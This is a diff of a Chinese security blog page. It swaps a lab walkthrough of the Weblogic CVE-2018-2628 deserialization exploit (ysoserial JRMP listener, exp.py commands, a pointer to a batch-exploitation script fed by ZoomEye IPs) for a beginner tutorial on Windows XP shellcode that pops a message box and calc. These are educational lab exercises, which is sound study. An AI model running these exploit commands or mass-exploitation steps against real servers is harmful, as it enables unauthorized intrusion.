@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>Weblogic deserialization vulnerability recurrence (CVE-2018-2628) | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="Weblogic deserialization vulnerability recurrence (CVE-2018-2628) | 九世的博客">
+  <title>shellcode编写(基础篇) | 九世的博客</title>
+  <meta name="keywords" content=" 红队实验 ">
+  <meta name="description" content="shellcode编写(基础篇) | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1405,9 +1405,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-Weblogic-deserialization-vulnerability-recurrence-CVE-2018-2628" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-shellcode编写-基础篇" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">Weblogic deserialization vulnerability recurrence (CVE-2018-2628)</h1>
+        <h1 class="article-title">shellcode编写(基础篇)</h1>
     
     <div class="article-meta">
         
@@ -1416,14 +1416,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color5">红队实验</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-19 20:36:16">2019-02-16 16:38</time>
+        创建时间:<time class="date" title="更新时间: 2020-05-20 18:15:56">2020-05-20 17:50</time>
         
     </div>
     <div class="article-meta">
@@ -1445,7 +1445,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文"><span class="toc-text">正文</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Starting"><span class="toc-text">Starting</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1460,39 +1460,107 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><hr>
-<p>复现CVE-2018-2628的反序列化漏洞，正好还欠慕慕一个对应的利用脚本。随便就一起搞了，搭建这个靶场可真的是耗费时间= =</p>
-<p><img src="http://5b0988e595225.cdn.sohucs.com/images/20180705/7ce9bee1c06544e8992b78c0a1b29dff.jpg" alt="7ce9bee1c06544e8992b78c0a1b29dff.jpg"></p>
-<p><b>BGM 方圆几里:</b><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=27955658&auto=1&height=66"></iframe></p>
-<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><hr>
-<p>首先去vulhub下好对应的项目，进入对应的文件夹，执行：</p>
-<pre><code>docker-compose up -d
-</code></pre><p>搭建好环境后，访问：127.0.0.1:7001<br>出现以下：<br><img src="https://s2.ax1x.com/2019/02/16/ksQKVH.png" alt="ksQKVH.png"></p>
-<p><b>漏洞介绍</b></p>
-<blockquote>
-<p>Oracle 2018年4月补丁中，修复了Weblogic Server WLS Core Components中出现的一个反序列化漏洞（CVE-2018-2628），该漏洞通过t3协议触发，可导致未授权的用户在远程服务器执行任意命令。</p>
-</blockquote>
-<p><b>漏洞复现</b><br>下载对应的利用工具：</p>
-<pre><code>wget https://github.com/brianwrf/ysoserial/releases/download/0.0.6-pri-beta/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar
-copy里面的利用代码https://www.exploit-db.com/exploits/44553
-</code></pre><p>利用：<br>启动一个JRMP Server：</p>
-<pre><code>java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener [listen port] CommonsCollections1 [command]
+        <p>昨天看资讯的时候看到fb一篇写shellcode的。最近也学了汇编试了一下整出来了，做个记录虽然实战不靠谱，还要自动化找函数地址…</p>
+<h2 id="Starting"><a href="#Starting" class="headerlink" title="Starting"></a>Starting</h2><p>环境：</p>
+<pre><code>Windows XP
+VC++ 6.0
+</code></pre><p>此方法只适用于测试或者学习，无法动态执行shellcode。也就是说shellcode只能在XP上使用，因为从win7开始有了aslr<br>ASLR说明：<a href="https://blog.morphisec.com/aslr-what-it-is-and-what-it-isnt/" target="_blank" rel="noopener">https://blog.morphisec.com/aslr-what-it-is-and-what-it-isnt/</a></p>
+<p>弹框测试：</p>
+<pre><code class="c">#include&lt;windows.h&gt;
+int main(int argc,char** argv){
+    MessageBox(NULL,&quot;You are hacked by Migraine!&quot;,&quot;Pwned&quot;,MB_OK);
+}
+</code></pre>
+<p>Alt+8调出反汇编模式可以观察是如何实现调用win API的<br><img src="https://s1.ax1x.com/2020/05/20/Y7Pete.png" alt=""></p>
+<p>通过参阅文章发现不能直接提取机器码，必须用汇编在写一遍。然后在提取字节码</p>
+<p>通过参阅文章明白汇编执行shellcode是如何执行的</p>
+<pre><code class="c">//转自安全客文章
+#include&lt;windows.h&gt;
+void main()
+{
+    LoadLibrary(&quot;user32.dll&quot;);//Load DLL
+    __asm
+    {    
+        push 0x00656e;ne
+        push 0x69617267;grai
+        push 0x694d2079;y Mi
+        push 0x62206565;ed b
+        push 0x6b636168;hack
+        push 0x20657261;Are
+        push 0x20756F59;You
+        mov ebx,esp
+        push 0x0
+        push 0x656e6961;aine
+        push 0x7267694d;Migr
+        mov ecx,esp
 
-listen port=监听的端口
-command=你要执行的命令
 
-例子：java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1001 CommonsCollections1 &#39;touch /haq520&#39;
-</code></pre><p><img src="https://s2.ax1x.com/2019/02/16/kstj2j.png" alt="kstj2j.png"></p>
-<p>发送exploit</p>
-<pre><code>
-python exp.py 127.0.0.1 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 127.0.0.1 1099 JRMPClient
-</code></pre><p><img src="https://s2.ax1x.com/2019/02/16/ksNMdK.md.png" alt=""></p>
-<p>结果：<br><img src="https://s2.ax1x.com/2019/02/16/ksNaeP.png" alt="ksNaeP.png"> </p>
-<p><b>实战</b><br>上面说了欠慕慕一个脚本，这里下午写完。放入了仓库<br><a href="https://github.com/422926799/python/tree/master/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%B9%E9%87%8F%E5%88%A9%E7%94%A8" target="_blank" rel="noopener">python/weblogic反序列化批量利用 at master · 422926799/python · GitHub</a></p>
-<p>说明：<br>weblogic反序列化批量利用，可通过网页关键字判断是否weblogic服务，批量检测或单个检测，判断7001端口是否开放,可从zoomeye抓取IP，请自行配置config文件夹里面的search.ini，填写zoomeye的user和pwd。</p>
-<p>测试结果：<br><img src="https://s2.ax1x.com/2019/02/16/ksNszj.png" alt="ksNszj.png"></p>
-<p><img src="https://s2.ax1x.com/2019/02/16/ksNTSJ.png" alt="ksNTSJ.png"></p>
-<p>转载请声明：转自422926799.github.io</p>
+        //int MessageBox( HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption,UINT uType );
+        xor eax,eax
+        push eax//uTyoe-&gt;0
+        push ecx//lpCaption-&gt;Migraine
+        push ebx//lpText-&gt;You are hacked by Migraine
+        push eax//hWnd-&gt;0
+        mov esi,0x77D3ADD7//User32.dll-&gt;MessageBoxA
+        call esi
+
+
+    }
+}
+</code></pre>
+<ul>
+<li>将需要用到的字符串转成十六进制，由于是X86，一次可最多存放8个字节</li>
+<li>将字符串转换的十六进制入栈</li>
+<li>push 0x0后然后重复将需要的东西入栈，在次保存到另外个寄存器</li>
+<li>然后从右到左设置win API的值（注意：从右到左）</li>
+<li>最后将windows API的地址给esi</li>
+<li>call 将当前执行指令地址入栈，然后无条件转移到由标签指示的指令</li>
+</ul>
+<p>通过OD给对应的API下断点，可以取得地址<br><img src="https://s1.ax1x.com/2020/05/20/Y7P29J.png" alt=""></p>
+<p>(注：每个系统的地址都有差异)<br><img src="https://s1.ax1x.com/2020/05/20/Y7PTAO.png" alt=""></p>
+<p>Examlpe：<br><img src="https://s1.ax1x.com/2020/05/20/Y7Pvut.png" alt=""></p>
+<p>然后使用C内嵌asm，调试提取机器码<br><img src="https://s1.ax1x.com/2020/05/20/Y7iGK1.png" alt=""></p>
+<p>整个asm范围的机器码提取出来：</p>
+<pre><code>&quot;\x68\x6E\x65\x00\x00\x68\x67\x72\x61\x69\x68\x79\x20\x4D\x69\x68\x65\x65\x20\x62&quot;
+&quot;\x68\x68\x61\x63\x6B\x68\x61\x72\x65\x20\x68\x61\x62\x63\x00\x8B\xDC\x6A\x00\x68&quot;
+&quot;\x61\x69\x6E\x65\x68\x4D\x69\x67\x72\x8B\xCC\x33\xC0\x50\x68\x61\x69\x6E\x65\x68&quot;
+&quot;\x4D\x69\x67\x72\x8B\xCC\x33\xC0\x50\x51\x53\x50\xBE\xEA\x07\xD5\x77\xFF\xD6&quot;
+</code></pre><p>执行即可：<br><img src="https://s1.ax1x.com/2020/05/20/Y7iUUO.png" alt=""></p>
+<p>用WinExec弹个calc</p>
+<pre><code class="c">//WinExec address-7C86250D
+//ExitProcess address-7C81CB12
+#include&lt;windows.h&gt;
+int main()
+{
+    LoadLibrary(&quot;kernel32.dll&quot;);
+    __asm
+        {
+        push 0x636C6163;calc
+        mov eax,esp
+        push 0x0
+        push 0x5
+        mov ebx,esp
+
+
+        push ebx
+        push eax
+        mov esi,0x7C86250D
+        call esi
+        xor ecx,ecx
+        mov esi,0x7C81CB12
+        call esi
+    }
+    return 0;
+}
+</code></pre>
+<p><img src="https://s1.ax1x.com/2020/05/20/Y7igVf.png" alt=""></p>
+<p>shellcode为</p>
+<pre><code>&quot;\x68\x63\x61\x6C\x63\x8B\xC4\x6A\x05\x8B\xDC\x53\x50\xBE\x0D\x25\x86\x7C&quot;
+&quot;\xFF\xD6\x33\xC9\xBE\x12\xCB\x81\x7C\xFF\xD6&quot;
+</code></pre><p><img src="https://s1.ax1x.com/2020/05/20/Y7iXiF.png" alt=""></p>
+<p><img src="https://s1.ax1x.com/2020/05/20/Y7F9qx.png" alt=""></p>
+<p>注意：如果你不知道calc变成十六进制怎么整，汇编整一个就好<br><img src="https://s1.ax1x.com/2020/05/20/Y7Ffw6.png" alt=""></p>
+<p>参考链接：<br><a href="https://www.freebuf.com/articles/system/234277.html" target="_blank" rel="noopener">随笔之提取Shellcode简单利用本地缓冲区溢出 - FreeBuf互联网安全新媒体平台</a><br><a href="https://www.anquanke.com/post/id/195498#h3-3" target="_blank" rel="noopener">一步步学写Windows下的Shellcode - 安全客，安全资讯平台</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1502,12 +1570,12 @@ python exp.py 127.0.0.1 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 127.0.0.1 109
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>Weblogic deserialization vulnerability recurrence (CVE-2018-2628)</p>
+    <p><span class="copy-title">文章标题:</span>shellcode编写(基础篇)</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-02-16, 16:38:27</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-19, 20:36:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/5a7054a8.html" title="Weblogic deserialization vulnerability recurrence (CVE-2018-2628)">http://422926799.github.io/posts/5a7054a8.html</a>
+    <p><span class="copy-title">发布时间:</span>2020-05-20, 17:50:51</p>
+    <p><span class="copy-title">最后更新:</span>2020-05-20, 18:15:56</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/c5435d4d.html" title="shellcode编写(基础篇)">http://422926799.github.io/posts/c5435d4d.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
